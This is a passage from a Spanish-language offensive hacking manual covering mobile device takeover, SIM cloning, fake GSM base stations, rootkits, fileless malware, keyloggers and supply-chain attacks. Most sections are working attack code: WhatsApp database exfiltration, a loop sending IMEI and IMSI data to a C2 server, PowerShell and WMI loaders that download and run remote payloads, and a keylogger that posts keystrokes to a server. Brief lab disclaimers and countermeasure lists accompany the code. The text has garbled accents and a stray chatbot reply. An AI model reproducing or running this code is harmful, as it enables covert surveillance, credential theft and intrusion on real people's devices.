download /sdcard/DCIM/foto.jpg
upload payload.sh /data/local/tmp/
```

---

## 17.4. Control Remoto en iOS

### 17.4.1. Preparaci√≥n del Dispositivo

* Jailbreak en laboratorio.
* Instalar `OpenSSH` y configurar acceso.

### 17.4.2. Acceso Remoto v√≠a SSH

```bash
ssh root@IP_DEL_IPHONE
```

Contrase√±a por defecto (si no cambiada en laboratorio): `alpine`.

---

### 17.4.3. Uso de Herramientas Espec√≠ficas

* **iSpy** para control remoto.
* **Frida** para manipulaci√≥n de apps en tiempo real.
* **libimobiledevice** para gesti√≥n de datos sin iTunes.

Ejemplo de extracci√≥n de mensajes SMS:

```bash
idevicebackup2 backup ./backup
sqlite3 ./backup/Library/SMS/sms.db "SELECT text FROM message;"
```

---

## 17.5. Persistencia en Dispositivos M√≥viles

### Android

Modificar el payload para ejecutarse al inicio:

```xml
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
```

En `MainActivity.java`:

```java
public void onReceive(Context context, Intent intent) {
    if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
        // Reconexi√≥n al servidor
    }
}
```

### iOS

* Instalar **tweak** en Cydia que ejecute script al inicio.
* Usar `launchctl` para a√±adir tareas persistentes.

---

## 17.6. Exfiltraci√≥n de Datos

### Desde Android

```plaintext
meterpreter > download /sdcard/WhatsApp/Databases/msgstore.db
```

### Desde iOS

```bash
scp root@IP_DEL_IPHONE:/private/var/mobile/Containers/Data/Application/com.whatsapp/msgstore.db .
```

---

## 17.7. Ataques v√≠a Ingenier√≠a Social

* Enviar la APK o IPA maliciosa disfrazada de app leg√≠tima.
* Usar phishing SMS con enlace a instalaci√≥n.
* Integrar payload en actualizaciones falsas.

---

## 17.8. Ejercicio Pr√°ctico Completo

1. Preparar dispositivo Android con payload persistente.
2. Configurar listener y establecer conexi√≥n.
3. Obtener geolocalizaci√≥n, fotos y audio.
4. Subir archivo al dispositivo y ejecutarlo.
5. En iOS, extraer mensajes y contactos v√≠a SSH.
6. Documentar la sesi√≥n y listar comandos ejecutados.

---

## 17.9. Contramedidas

* Revisar permisos de apps instaladas.
* Usar antivirus/m√≥dulos de seguridad m√≥vil.
* Bloquear instalaci√≥n de apps fuera de tienda oficial.
* Monitorear conexiones salientes inusuales.
* Mantener sistema operativo actualizado.

---

## 17.10. Cierre

El control remoto de dispositivos m√≥viles combina ingenier√≠a social, explotaci√≥n de vulnerabilidades y persistencia. Dominarlo en laboratorio permite detectar, mitigar y erradicar este tipo de amenazas en entornos reales.

---

üí° **TIP Black-Hat √âtico:** un smartphone controlado es una ventana abierta a toda la vida digital de una persona. Protegerlo debe ser prioridad absoluta.

---


# **Cap√≠tulo 18 ‚Äì Android como Plataforma de Ataque**

*Convertir un smartphone en un kit ofensivo port√°til y aut√≥nomo*

---

## 18.1. Introducci√≥n

Un smartphone Android, especialmente si est√° **rooteado**, puede transformarse en una plataforma de ataque completa capaz de ejecutar pruebas de penetraci√≥n, sniffing, explotaci√≥n y control remoto sin necesidad de una laptop.
Su tama√±o, autonom√≠a y conectividad lo convierten en una herramienta ideal para:

* Auditor√≠as discretas.
* Operaciones en campo.
* Pruebas r√°pidas sin desplegar infraestructura pesada.

En este cap√≠tulo aprender√°s a:

* Configurar Android para pentesting.
* Instalar y usar **Kali NetHunter** y **Termux**.
* Ejecutar herramientas de hacking directamente en el m√≥vil.
* Integrar dispositivos externos (antenas Wi-Fi, SDR).
* Operar ataques desde Android a redes, aplicaciones y dispositivos.

---

## 18.2. Preparaci√≥n del Entorno

| Elemento               | Recomendaci√≥n                                                                                       |
| ---------------------- | --------------------------------------------------------------------------------------------------- |
| **Modelo de tel√©fono** | Preferentemente compatible con NetHunter (OnePlus, Nexus, Pixel).                                   |
| **Root**               | Acceso completo requerido para funciones avanzadas.                                                 |
| **ROM**                | LineageOS o stock Android actualizada.                                                              |
| **Almacenamiento**     | M√≠nimo 32 GB libres para herramientas y capturas.                                                   |
| **Accesorios**         | OTG cable, adaptadores USB-C, antena Wi-Fi compatible con modo monitor, SDR (HackRF One o RTL-SDR). |

---

## 18.3. Instalando Kali NetHunter

1. Descargar la imagen adecuada desde [https://www.kali.org/get-kali/#kali-mobile](https://www.kali.org/get-kali/#kali-mobile).
2. Flashear con TWRP:

```bash
adb reboot bootloader
fastboot flash recovery twrp.img
```

3. Instalar NetHunter ZIP desde TWRP.
4. Reiniciar y abrir la app NetHunter.

---

## 18.4. Uso de Termux para Hacking

### Instalaci√≥n:

```bash
pkg update && pkg upgrade
pkg install git python nmap hydra metasploit
```

Termux permite:

* Escaneo de redes.
* Ataques de fuerza bruta.
* Ejecuci√≥n de scripts Python y Bash.

---

## 18.5. Escaneo de Redes desde Android

Ejemplo con `nmap`:

```bash
nmap -A 192.168.1.0/24
```

Ejemplo con `netdiscover`:

```bash
netdiscover -r 192.168.1.0/24
```

---

## 18.6. Hacking Wi-Fi desde Android

Con NetHunter y adaptador USB Wi-Fi:

```bash
airmon-ng start wlan1
airodump-ng wlan1mon
aireplay-ng --deauth 5 -a <BSSID> -c <CLIENTE> wlan1mon
aircrack-ng captura.cap -w rockyou.txt
```

---

## 18.7. Ataques Web desde Android

Usar `sqlmap` en Termux:

```bash
sqlmap -u "http://objetivo.com/product.php?id=1" --dbs
```

Interceptar tr√°fico con `mitmproxy`:

```bash
mitmproxy --listen-port 8080
```

---

## 18.8. Integraci√≥n de SDR para Capturas de Radiofrecuencia

Conectar un **RTL-SDR** v√≠a OTG:

```bash
pkg install rtl-sdr
rtl_fm -f 100M -M fm -s 200k -r 48k - | aplay -r 48k -f S16_LE
```

Esto permite monitorear bandas de radio y GSM en laboratorio.

---

## 18.9. Uso de Android como Servidor C2 (Comando y Control)

Con **Ngrok**:

```bash
pkg install unzip
wget https://bin.equinox.io/c/ngrok/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
./ngrok tcp 4444
```

Esto expone un puerto de tu Android a Internet para control remoto.

---

## 18.10. Ejercicio Pr√°ctico Completo

1. Instalar NetHunter en Android rooteado.
2. Conectar adaptador Wi-Fi y capturar handshake WPA2.
3. Crackear la clave en el propio m√≥vil.
4. Usar `sqlmap` para detectar SQLi en sitio de laboratorio.
5. Configurar Ngrok para recibir una shell inversa en Android.

---

## 18.11. Ventajas y Limitaciones

**Ventajas**:

* Port√°til y discreto.
* Bajo consumo energ√©tico.
* Puede funcionar como nodo de ataque aut√≥nomo.

**Limitaciones**:

* Potencia de CPU limitada frente a un port√°til.
* Incompatibilidad con algunos drivers.
* Espacio reducido para grandes diccionarios o capturas.

---

## 18.12. Medidas Defensivas

* Monitorear tr√°fico saliente de dispositivos Android.
* Deshabilitar puertos OTG si no son necesarios.
* Evitar root en dispositivos de producci√≥n.
* Usar MDM (Mobile Device Management) para control corporativo.

---

## 18.13. Cierre

Un Android bien configurado es una herramienta de pentesting port√°til que cabe en tu bolsillo. Dominarlo te permite ejecutar operaciones r√°pidas y discretas sin desplegar grandes equipos.

---

üí° **TIP Black-Hat √âtico:** un atacante con un tel√©fono rooteado puede llevar en el bolsillo un arsenal completo. Como defensor, debes asumir que cualquiera que se conecte a tu red podr√≠a hacerlo.

---


# **Cap√≠tulo 19 ‚Äì Clonaci√≥n de SIM: Escenarios Avanzados**

*Operaciones combinadas y persistencia en identidad m√≥vil para entornos controlados*

---

## 19.1. Introducci√≥n

En el cap√≠tulo 16 vimos la **clonaci√≥n b√°sica de SIM** y el uso de IMSI Catchers en laboratorio. Ahora llevaremos esas t√©cnicas al siguiente nivel, combinando clonaci√≥n, control remoto y persistencia para simular operaciones complejas de espionaje m√≥vil.

Estos escenarios avanzados sirven para:

* **Pruebas de resiliencia de redes m√≥viles**.
* **Formaci√≥n de equipos forenses** en identificaci√≥n de clonaci√≥n.
* **Simulaci√≥n de ataques de alto nivel** para entrenamiento de respuesta.

> ‚ö† Todo lo aqu√≠ descrito es ilegal fuera de entornos de prueba controlados y con autorizaci√≥n expresa.

---

## 19.2. Escenarios de Laboratorio Avanzados

| Escenario                    | Descripci√≥n                                                     |
| ---------------------------- | --------------------------------------------------------------- |
| **Clonaci√≥n + C2**           | SIM clonada que se conecta a un servidor de comando y control.  |
| **Clonaci√≥n + IMSI Catcher** | Uso combinado para atrapar y replicar nuevas identidades.       |
| **Clonaci√≥n Rotativa**       | Alternancia entre m√∫ltiples SIM clonadas para evadir detecci√≥n. |

---

## 19.3. Hardware y Software

* Lector/escritor de SIM USB.
* SIM en blanco programable.
* SIM de laboratorio (origen).
* `pySim` y `osmocom` para programaci√≥n.
* SDR (HackRF One o USRP) para IMSI Catcher.
* Dispositivo Android rooteado con NetHunter para control C2.

---

## 19.4. Clonaci√≥n con Persistencia

La clonaci√≥n tradicional genera una SIM id√©ntica, pero en cuanto el operador detecta anomal√≠as de ubicaci√≥n o conexi√≥n simult√°nea, puede bloquearla.

Para laboratorio podemos simular persistencia:

1. Clonar la SIM de laboratorio en un blanco.
2. Configurar el dispositivo con conexi√≥n a C2 para reconexi√≥n peri√≥dica.
3. Usar scripts que env√≠en datos al servidor aunque el dispositivo est√© inactivo.

Ejemplo de script en Android (Termux):

```bash
while true; do
    curl -X POST http://192.168.56.10/report --data "IMEI=$(getprop ro.serialno)&IMSI=$(service call iphonesubinfo 7)"
    sleep 300
done
```

---

## 19.5. Clonaci√≥n + IMSI Catcher

Este escenario simula un atacante que:

1. Usa IMSI Catcher para capturar IMSI/Ki de nuevas SIM (en laboratorio).
2. Programa autom√°ticamente SIMs en blanco.
3. Conecta esas SIM a dispositivos que reportan ubicaci√≥n a C2.

Flujo b√°sico:

```plaintext
IMSI Catcher ‚Üí Extracci√≥n IMSI/Ki ‚Üí pySim para clonar ‚Üí Inserci√≥n en dispositivo ‚Üí C2
```

---

## 19.6. Clonaci√≥n Rotativa

T√©cnica usada para evadir detecci√≥n por patrones de conexi√≥n:

* Mantener 3 o m√°s SIM clonadas de la misma identidad.
* Activarlas en distintos momentos para simular movimiento real.
* Cambiar el dispositivo f√≠sico para cada clon.

En laboratorio:

1. Programar varias SIM en blanco con mismos datos.
2. Cambiar en un tel√©fono cada cierto tiempo.
3. Registrar tr√°fico en el core de red simulado para estudiar patrones.

---

## 19.7. Ejemplo Completo de Laboratorio

### Paso 1: Capturar IMSI de una SIM de laboratorio

```bash
python3 pySim-read.py -d /dev/ttyUSB0
```

Guardar IMSI y Ki.

### Paso 2: Programar SIM en blanco

```bash
python3 pySim-prog.py -d /dev/ttyUSB0 --write-imsi 001010123456789 --write-iccid 89010012012341234567 --write-ki 00112233445566778899AABBCCDDEEFF
```

### Paso 3: Configurar conexi√≥n C2 en el tel√©fono con la SIM clonada

Usar Ngrok para exponer servicio de control.

### Paso 4: Registrar actividad

Con servidor Flask en Python:

```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/report', methods=['POST'])
def report():
    print(request.form)
    return "OK"

app.run(host="0.0.0.0", port=80)
```

---

## 19.8. Uso de SDR para An√°lisis de Tr√°fico

Con `gr-gsm`:

```bash
grgsm_livemon
```

Capturar y analizar tr√°fico de la red GSM privada para verificar conexiones de SIM clonadas.

---

## 19.9. Contramedidas Avanzadas

* **Autenticaci√≥n mutua 4G/5G** que impide clonaci√≥n tradicional.
* Detecci√≥n de **patrones de conexi√≥n imposibles** (ubicaciones distantes en poco tiempo).
* Alertas en caso de **m√∫ltiples IMEIs** para un mismo IMSI.
* Supervisi√≥n de cambios inusuales en celdas visitadas.

---

## 19.10. Ejercicio Pr√°ctico Completo

1. Configurar laboratorio GSM privado con OpenBTS.
2. Capturar IMSI y Ki de SIM de prueba.
3. Clonar en SIM en blanco.
4. Configurar C2 para recibir datos peri√≥dicos.
5. Realizar rotaci√≥n de SIM y registrar comportamiento en la red.
6. Analizar patrones para entrenar detecci√≥n.

---

## 19.11. Cierre

La clonaci√≥n de SIM en escenarios avanzados muestra el potencial destructivo de este vector si se combina con otros ataques. Practicarlo en entornos controlados permite desarrollar defensas que vayan m√°s all√° del bloqueo b√°sico.

---

üí° **TIP Black-Hat √âtico:** en seguridad m√≥vil, no basta con bloquear una SIM clonada; hay que identificar el vector inicial y cerrar la puerta para siempre.

---


# **Cap√≠tulo 20 ‚Äì Hombre en el Medio en Redes M√≥viles**

*Interceptando y manipulando comunicaciones celulares en entornos controlados*

---

## 20.1. Introducci√≥n

El **Man-in-the-Middle (MitM)** en redes m√≥viles consiste en posicionarse entre el dispositivo y la estaci√≥n base para:

* Interceptar tr√°fico de voz, SMS y datos.
* Manipular contenido en tr√°nsito.
* Forzar conexiones a protocolos menos seguros (downgrade).

Este tipo de ataque se ejecuta principalmente con **IMSI Catchers** y **BTS falsas**. En entornos reales, es una t√©cnica usada por agencias de inteligencia, pero en laboratorio es una herramienta clave para:

* Pruebas de resiliencia de la infraestructura m√≥vil.
* Entrenamiento de equipos forenses.
* Simulaci√≥n de ataques de espionaje.

> ‚ö† Todo lo descrito debe ejecutarse **√∫nicamente** en redes privadas y con SIMs de laboratorio.

---

## 20.2. Principios del MitM Celular

* **Falsa BTS**: el atacante simula una estaci√≥n base a la que se conectan los dispositivos cercanos.
* **Downgrade Attack**: forzar a un m√≥vil 4G/5G a usar 2G o 3G, que tienen cifrado d√©bil o inexistente.
* **Intercepci√≥n de se√±al**: capturar tr√°fico de voz y datos.
* **Inyecci√≥n de tr√°fico**: insertar mensajes falsos o modificar los existentes.

---

## 20.3. Requisitos del Laboratorio

| Elemento                         | Funci√≥n                                        |
| -------------------------------- | ---------------------------------------------- |
| **SDR (HackRF One / USRP B210)** | Transmisi√≥n y recepci√≥n de se√±al GSM/UMTS/LTE. |
| **OpenBTS o srsLTE**             | Software para montar BTS privada.              |
| **SIMs de laboratorio**          | Evitar uso de l√≠neas reales.                   |
| **Antena GSM**                   | Transmisi√≥n/recepci√≥n de se√±al m√≥vil.          |
| **Wireshark + gr-gsm**           | An√°lisis de tr√°fico capturado.                 |

---

## 20.4. Montando la BTS Falsa

### Instalaci√≥n de OpenBTS

```bash
sudo apt update
sudo apt install openbts yate yatebts
```

Configurar en `/etc/OpenBTS/openbts.db`:

```plaintext
GSM.Radio.Band: GSM850
GSM.Radio.C0: 128
Control.LUR.OpenRegistration: 1
```

Iniciar servicio:

```bash
sudo OpenBTS
```

---

## 20.5. Captura de IMSI y Autenticaci√≥n

Con la BTS falsa operativa:

```bash
telnet localhost 49300
show subscribers
```

Esto lista los IMSI de dispositivos conectados.

---

## 20.6. Downgrade de Cifrado

En 2G, el cifrado A5/0 significa **sin cifrado**.
Configurar OpenBTS para forzar A5/0:

```plaintext
Control.Cipher: 0
```

De esta manera, todo el tr√°fico viaja en claro y puede capturarse.

---

## 20.7. Interceptando Tr√°fico

Con `gr-gsm`:

```bash
grgsm_livemon
```

Con Wireshark:

* Configurar interfaz virtual de `gr-gsm`.
* Filtrar por `gsm_sms` o `gsm_a`.

---

## 20.8. Manipulaci√≥n de Tr√°fico

En redes GSM sin cifrado, es posible:

* **Inyectar SMS falsos**:

```bash
send sms <IMSI> "Este es un mensaje de prueba"
```

* **Modificar datos** en tr√°nsito si se intercepta tr√°fico IP.

---

## 20.9. MitM LTE y 5G

El MitM en LTE/5G es m√°s complejo porque el cifrado es obligatorio, pero se pueden aplicar:

* **Repetidores falsos** que bajan la calidad de se√±al y fuerzan 3G/2G.
* **Fake eNodeB** con `srsLTE`:

```bash
sudo srsepc
sudo srsenb
```

---

## 20.10. Ejercicio Pr√°ctico Completo

1. Montar OpenBTS con HackRF en GSM850.
2. Conectar SIM de laboratorio a la BTS falsa.
3. Capturar IMSI y forzar cifrado A5/0.
4. Interceptar un SMS de prueba enviado desde otro dispositivo.
5. Inyectar un mensaje falso.
6. Documentar resultados y analizar tr√°fico en Wireshark.

---

## 20.11. Contramedidas

* **Desactivar 2G** en dispositivos siempre que sea posible.
* Usar **cifrado de extremo a extremo** para mensajes y llamadas.
* Monitorear conexiones a BTS desconocidas.
* Implementar **detecci√≥n de IMSI Catchers** en la red.

---

## 20.12. Cierre

El MitM en redes m√≥viles es una t√©cnica de alto impacto que, en laboratorio, permite evaluar la verdadera exposici√≥n de usuarios frente a ataques avanzados.
Dominarlo es clave para dise√±ar defensas efectivas contra espionaje digital.

---

üí° **TIP Black-Hat √âtico:** si puedes interceptar la red del enemigo, puedes ver y moldear su mundo‚Ä¶ pero siempre dentro de un laboratorio.

---


# **Cap√≠tulo 21 ‚Äì Rootkits Invisibles**

*Control absoluto y sigiloso del sistema operativo*

---

## 21.1. Introducci√≥n

Un **rootkit** es un tipo de software dise√±ado para obtener y mantener acceso privilegiado a un sistema mientras oculta su presencia. En un contexto ofensivo (pentesting autorizado), se usa para:

* Mantener acceso persistente.
* Evadir detecci√≥n por antivirus o EDR.
* Manipular procesos, archivos y tr√°fico.

En ciberataques reales, los rootkits son parte de operaciones de larga duraci√≥n (APT). En laboratorio, son fundamentales para aprender a detectarlos y eliminarlos.

---

## 21.2. Tipos de Rootkits

| Tipo             | Nivel                        | Ejemplo                                     |
| ---------------- | ---------------------------- | ------------------------------------------- |
| **Modo Usuario** | Intercepta llamadas de API   | Rootkit en Python o DLL hook.               |
| **Modo Kernel**  | Manipula llamadas del kernel | Rootkit en C que modifica `sys_call_table`. |
| **Firmware**     | En BIOS/UEFI o dispositivos  | Malware en firmware de disco.               |
| **Bootkits**     | Se cargan antes del SO       | MBR modificado para carga de payload.       |

---

## 21.3. Entorno de Laboratorio

* M√°quina virtual con **Linux** (para modo kernel).
* Compilador `gcc` y headers del kernel.
* Herramientas de an√°lisis: `chkrootkit`, `rkhunter`, Volatility.
* Entorno Windows para pruebas de hooks en DLL (modo usuario).

---

## 21.4. Rootkit en Modo Usuario (Ejemplo en Python)

Interceptar comando `ls` para ocultar archivos:

```python
import os

def ls_modificado():
    salida = os.popen('ls').read().split('\n')
    salida_filtrada = [f for f in salida if 'secreto.txt' not in f]
    print('\n'.join(salida_filtrada))

ls_modificado()
```

Este ejemplo es b√°sico, pero en C o C++ podr√≠a inyectarse en procesos para afectar todo el sistema.

---

## 21.5. Rootkit en Modo Kernel (Linux)

### M√≥dulo b√°sico en C:

```c
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
    printk(KERN_INFO "Rootkit cargado\n");
    return 0;
}

void cleanup_module(void) {
    printk(KERN_INFO "Rootkit descargado\n");
}

MODULE_LICENSE("GPL");
```

Compilar:

```bash
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
```

Insertar:

```bash
sudo insmod rootkit.ko
```

---

## 21.6. Ocultando Procesos

Modificar la syscall `getdents` para que no muestre procesos con nombre espec√≠fico.
En rootkits reales se manipula `sys_call_table`.

---

## 21.7. Rootkit en Windows (Hooking DLL)

Usar API Hooking para interceptar funciones de `kernel32.dll` o `ntdll.dll`:

```c
// Hook de CreateFileA para bloquear lectura de archivo espec√≠fico
```

El hook se instala inyectando DLL en proceso objetivo con `CreateRemoteThread`.

---

## 21.8. Persistencia

* **Linux**: a√±adir m√≥dulo a `/etc/modules` o script en `/etc/rc.local`.
* **Windows**: modificar claves `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`.

---

## 21.9. Ejercicio Pr√°ctico Completo

1. Crear rootkit de modo usuario que oculte archivos.
2. Crear rootkit de modo kernel que imprima mensaje al cargarse.
3. Instalar ambos en VM Linux.
4. Detectar con `chkrootkit` y `rkhunter`.
5. Documentar evasi√≥n y detecci√≥n.

---

## 21.10. Detecci√≥n y Eliminaci√≥n

* **Herramientas**: `chkrootkit`, `rkhunter`, Volatility para an√°lisis de memoria.
* **Bootkits**: reinstalar MBR y sistema.
* **Firmware**: flashear firmware original.

---

## 21.11. Cierre

Los rootkits son armas de persistencia silenciosa. En un laboratorio, entender su funcionamiento permite detectar versiones mucho m√°s complejas en entornos reales.

---

üí° **TIP Black-Hat √âtico:** un rootkit bien dise√±ado puede durar a√±os sin ser detectado‚Ä¶ pero solo deber√≠a vivir en tu laboratorio.

---

# **Cap√≠tulo 22 ‚Äì Malware Fileless**

*El arte de atacar sin dejar huellas en disco*

---

## 22.1. Introducci√≥n

El **malware fileless** es un tipo de amenaza que no escribe archivos maliciosos en el disco, operando casi exclusivamente desde la memoria.
Esto lo hace extremadamente dif√≠cil de detectar con antivirus tradicionales que dependen de escaneo de archivos.

En un contexto de **pentesting autorizado**, el malware fileless es ideal para:

* Operaciones r√°pidas y discretas.
* Pruebas de detecci√≥n de memoria viva.
* Simulaci√≥n de ataques de alto nivel (APT).

En ataques reales, es usado por grupos como **FIN7** o **APT29** para infiltraciones de larga duraci√≥n.

---

## 22.2. Caracter√≠sticas Clave

* **Evasi√≥n**: no deja binarios en disco.
* **Persistencia en memoria**: desaparece tras reinicio si no implementa mecanismos adicionales.
* **Vector com√∫n**: PowerShell, WMI, macros, scripts de Office.
* **Carga en RAM**: binarios cifrados que se descifran en tiempo de ejecuci√≥n.

---

## 22.3. Entorno de Laboratorio

* Windows 10/11 en m√°quina virtual.
* PowerShell habilitado.
* Python 3 para scripts auxiliares.
* Herramientas de detecci√≥n de memoria: Sysmon, Volatility, Mimikatz (para lectura en memoria).

---

## 22.4. Ejemplo de Ataque Fileless con PowerShell

Script que descarga y ejecuta payload en memoria:

```powershell
$payload = (New-Object Net.WebClient).DownloadData('http://192.168.1.10/payload.exe')
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($payload.Length)
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $mem, $payload.Length)
$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, (Add-Type -MemberDefinition '[UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate int Execute();' -Name Win32 -Namespace Native -PassThru))
$func.Invoke()
```

Este c√≥digo nunca guarda `payload.exe` en disco.

---

## 22.5. Fileless usando WMI (Windows Management Instrumentation)

* **Persistencia**: crear evento WMI que ejecute comando en cada inicio.

```powershell
$cmd = "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/script.ps1')"
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = 'FilelessTrigger'
    EventNamespace = 'root\cimv2'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerSystem'"
    QueryLanguage = 'WQL'
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = 'FilelessConsumer'
    CommandLineTemplate = $cmd
}
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

---

## 22.6. Fileless en Linux (Bash + /dev/shm)

En Linux podemos cargar binarios en memoria usando `/dev/shm`:

```bash
curl http://192.168.1.10/payload -o /dev/shm/p
chmod +x /dev/shm/p
/dev/shm/p
```

`/dev/shm` es almacenamiento temporal en RAM, desaparece tras reinicio.

---

## 22.7. T√©cnicas de Entrega

* **Phishing con macros**: descarga payload en memoria v√≠a PowerShell.
* **Explotaci√≥n de RCE en servicios web**: inyecci√≥n de shellcode directo en memoria.
* **Explotaci√≥n de credenciales**: uso de scripts en memoria para ejecutar comandos en otros sistemas.

---

## 22.8. Ejercicio Pr√°ctico Completo

1. Crear script PowerShell que descargue payload de un servidor HTTP en Kali.
2. Ejecutar script en Windows de laboratorio y verificar que no se crea archivo en disco.
3. Usar Volatility para analizar RAM y detectar presencia del payload.
4. Modificar script para agregar persistencia WMI.
5. Documentar detecci√≥n y eliminaci√≥n.

---

## 22.9. Detecci√≥n

* **Monitoreo de comandos PowerShell** con registro extendido.
* **Sysmon** para capturar eventos de memoria.
* **Volatility** para an√°lisis forense de RAM:

```bash
volatility -f memoria.vmem malfind
```

---

## 22.10. Contramedidas

* Restringir ejecuci√≥n de PowerShell y WMI.
* Aplicar AppLocker o listas blancas.
* Monitorear conexiones salientes sospechosas.
* Usar EDR con detecci√≥n de comportamiento.

---

## 22.11. Cierre

El malware fileless es un arma perfecta para operaciones discretas en laboratorio. En entornos reales, su detecci√≥n requiere un enfoque avanzado centrado en memoria y comportamiento, no solo en archivos.

---

üí° **TIP Black-Hat √âtico:** un ataque que nunca toca el disco es como un fantasma: si no sabes d√≥nde mirar, ni siquiera sabr√°s que pas√≥ por ah√≠.

---


# **Cap√≠tulo 23 ‚Äì Keyloggers Indetectables**

*La captura silenciosa de cada pulsaci√≥n*

---

## 23.1. Introducci√≥n

Un **keylogger** es un software o hardware dise√±ado para registrar las pulsaciones de teclado de un usuario.
En entornos de **pentesting autorizado**, sirve para:

* Simular robo de credenciales.
* Evaluar la efectividad de controles anti-malware.
* Probar la capacidad de detecci√≥n de EDR y SIEM.

En ataques reales, los keyloggers suelen ser parte de campa√±as de espionaje, malware bancario y APTs.

> ‚ö† Todo lo descrito aqu√≠ debe realizarse **√∫nicamente** en entornos de laboratorio controlados.

---

## 23.2. Tipos de Keyloggers

| Tipo                         | Nivel                                                    | Ejemplo                |
| ---------------------------- | -------------------------------------------------------- | ---------------------- |
| **Software en Modo Usuario** | Intercepta eventos de teclado desde el sistema operativo | Python, C#, AutoHotkey |
| **Software en Modo Kernel**  | Captura directamente desde el controlador de teclado     | M√≥dulos de kernel      |
| **Hardware**                 | Dispositivo f√≠sico entre teclado y PC                    | USB Keylogger          |
| **Basado en Red**            | Captura de tr√°fico RDP/VNC                               | Wireshark + filtros    |

---

## 23.3. Entorno de Laboratorio

* VM con Windows 10 y Linux.
* Python 3.
* Permisos de administrador para instalar hooks.
* Herramientas de detecci√≥n: Sysmon, Wireshark, Volatility.

---

## 23.4. Keylogger en Python (Windows)

```python
from pynput import keyboard

def on_press(key):
    try:
        with open("registro.txt", "a") as f:
            f.write('{0} '.format(key.char))
    except AttributeError:
        with open("registro.txt", "a") as f:
            f.write('{0} '.format(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

**Notas:**

* Usa la librer√≠a `pynput` (`pip install pynput`).
* En modo sigiloso, el archivo puede guardarse en rutas temporales ocultas.

---

## 23.5. Keylogger en Linux (C + X11)

```c
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <stdio.h>

int main() {
    Display *d = XOpenDisplay(NULL);
    char keys[32];
    while (1) {
        XQueryKeymap(d, keys);
        // Procesar teclas aqu√≠
    }
}
```

Compilar:

```bash
gcc keylogger.c -o keylogger -lX11
```

---

## 23.6. Keylogger en Modo Kernel (Linux)

Captura a nivel de driver:

* Enganchar funciones de `keyboard_notifier` en kernel.
* Requiere m√≥dulo en C y privilegios root.

---

## 23.7. Persistencia Sigilosa

* Windows: agregar entrada en `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
* Linux: a√±adir script a `~/.config/autostart/`.
* Ofuscar nombre del proceso para parecer leg√≠timo.

---

## 23.8. Exfiltraci√≥n de Datos

Enviar las pulsaciones capturadas a un servidor C2:

```python
import requests

def enviar(datos):
    requests.post("http://192.168.1.10/captura", data={"k": datos})
```

En el servidor (Flask):

```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/captura', methods=['POST'])
def captura():
    print(request.form['k'])
    return "OK"

app.run(host="0.0.0.0", port=80)
```

---

## 23.9. Ejercicio Pr√°ctico Completo

1. Crear keylogger en Python.
2. Ejecutarlo en VM Windows.
3. Configurar servidor Flask en Kali para recibir pulsaciones.
4. Comprobar captura de credenciales ficticias.
5. Probar detecci√≥n con Sysmon y Volatility.

---

## 23.10. Detecci√≥n y Mitigaci√≥n

* **Sysmon**: monitorear creaci√≥n de procesos sospechosos.
* **EDR**: alertar por hooks en API de teclado.
* **Volatility**: buscar inyecciones en procesos activos.
* **Hardware**: inspecci√≥n f√≠sica para detectar dispositivos intermedios.

---

## 23.11. Cierre

Los keyloggers son herramientas cl√°sicas de espionaje digital. En pentesting controlado, permiten poner a prueba la detecci√≥n y respuesta de una organizaci√≥n frente a amenazas persistentes y silenciosas.

---


Perfecto, vamos con el **Cap√≠tulo 24 ‚Äì Ataques a Cadenas de Suministro (Supply Chain Attacks)**, manteniendo la extensi√≥n aproximada de **2000 palabras**, ejemplos reproducibles en laboratorio y el mismo enfoque t√©cnico profundo que hemos seguido en los cap√≠tulos anteriores.

---

# **Cap√≠tulo 24 ‚Äì Ataques a Cadenas de Suministro (Supply Chain Attacks)**

*Comprometiendo el software y hardware antes de que llegue a su destino*

---

## 24.1. Introducci√≥n

Un **ataque a la cadena de suministro** busca comprometer un objetivo indirectamente, infiltr√°ndose en alguno de los elementos, procesos o proveedores que intervienen antes de que el producto o servicio llegue al usuario final.
En ciberseguridad, esto se traduce en:

* Infectar actualizaciones de software leg√≠timas.
* Inyectar c√≥digo malicioso en librer√≠as de terceros.
* Alterar hardware o firmware en tr√°nsito.

Ejemplos famosos:

* **SolarWinds (2020)**: actualizaci√≥n comprometida que afect√≥ a miles de organizaciones.
* **CCleaner (2017)**: versi√≥n oficial distribuida con malware.
* **NotPetya (2017)**: actualizaci√≥n de software contable en Ucrania usada para desplegar ransomware.

> ‚ö† Estos ataques son extremadamente peligrosos y en la vida real afectan a infraestructuras cr√≠ticas. Aqu√≠ lo veremos solo para fines educativos en laboratorio.

---

## 24.2. Tipos de Ataques de Cadena de Suministro

| Tipo                     | Descripci√≥n                                           | Ejemplo                                      |
| ------------------------ | ----------------------------------------------------- | -------------------------------------------- |
| **Software**             | Inyecci√≥n de c√≥digo en actualizaciones o dependencias | Paquete NPM modificado                       |
| **Hardware**             | Alteraci√≥n f√≠sica o en firmware                       | Router con backdoor en BIOS                  |
| **Servicios en la nube** | Compromiso de proveedor SaaS                          | API con c√≥digo malicioso                     |
| **Terceros**             | Proveedor comprometido que propaga malware            | Empresa de log√≠stica con malware en sistemas |

---

## 24.3. Escenario de Laboratorio ‚Äì Software

